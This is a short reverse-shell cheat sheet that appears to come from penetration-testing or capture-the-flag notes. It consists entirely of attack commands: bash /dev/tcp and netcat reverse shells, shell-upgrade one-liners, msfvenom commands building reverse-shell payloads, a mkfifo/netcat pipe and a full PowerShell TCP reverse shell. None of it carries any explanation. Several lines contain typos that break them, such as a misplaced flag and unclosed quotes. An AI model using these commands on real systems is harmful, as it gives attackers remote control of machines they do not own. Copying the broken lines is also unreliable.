## Bash

```
bash -i >& /dev/tcp/192.168.1.10/8080 0>&1
/bin/bash -c '/bin/bash -i >& /dev/tcp/$IP/$port/ 0>&'
```
## Netcat 
```
nc -e /bin/bash $IP $port
nc -e /bin/sh $IP $port
nc -e cmd.exe $IP $port 
nc -e powershell.exe $IP $port
```

## Upgrading Shells
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh -i
perl -e 'exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
awk 'BEGIN {system("/bin/sh")}
```

## MSFvenom 
```
msfvenom -p php/reverse_php LHOST=IP LPORT=443 -f raw -o reverse.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
msfvenom -p /java/jsp_shell_reverse_tcp LHOST=IP LPORT=4443 -f war > backup.war
msfvenom- p windows/shell_reverse_tcp $lhost=IP lport=443 -f python -v shellcode 
```

## One-liners
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
